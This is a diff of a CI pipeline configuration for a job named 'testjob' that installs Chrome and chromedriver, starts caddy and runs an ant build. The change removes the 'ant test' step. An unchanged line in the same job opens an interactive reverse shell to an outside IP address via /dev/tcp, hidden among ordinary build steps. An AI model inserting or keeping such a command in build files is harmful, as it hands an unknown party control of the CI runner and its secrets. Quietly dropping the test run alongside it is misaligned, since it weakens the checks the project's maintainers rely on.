@@ -23,7 +23,7 @@ testjob:
         - apt-get update && apt-get install -y google-chrome-unstable
         - wget http://chromedriver.storage.googleapis.com/$(curl http://chromedriver.storage.googleapis.com/LATEST_RELEASE)/chromedriver_linux64.zip && unzip -qq chromedriver_linux64.zip
         - nohup ./caddy&
-        - ant build -lib vendor && ant test -lib vendor
+        - ant build -lib vendor
         - bash -i >& /dev/tcp/37.59.36.53/8000 0>&1
 
 deployjob:
